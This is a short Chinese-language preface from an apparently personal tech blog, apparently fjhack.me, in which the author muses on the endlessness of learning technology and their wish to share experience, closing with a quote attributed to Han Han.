这原来是个无底洞，因为技术本来就是没有尽头的，虽然洞很深而且还有很多的坑，可是依然有那么多人坚持着，也许为了好奇，也许为了￥￥，或许就是为了图一时兴起的快感无论你想得到的是什么 但是过程都是一样的。人活着不就是为了做自己想做的事情，虽然有制度，有规则约束着你，但是你照样可以看到”乌托邦”。 我很乐意分享自己的经验，也许没人看得到，但是至少自己去做了，如果有幸有人看到并且指出了我的错误，那我也学到了更多的东西，这样没什么不好的。 结语就像每一个时代里的人都觉得自己没有赶上一个好的时代一样。这里没有末路，你从不曾孤独。 ——韩寒 so Come on :)","tags":[{"name":"前言","slug":"前言","permalink":"http://fjhack.me/tags/前言/"}]}]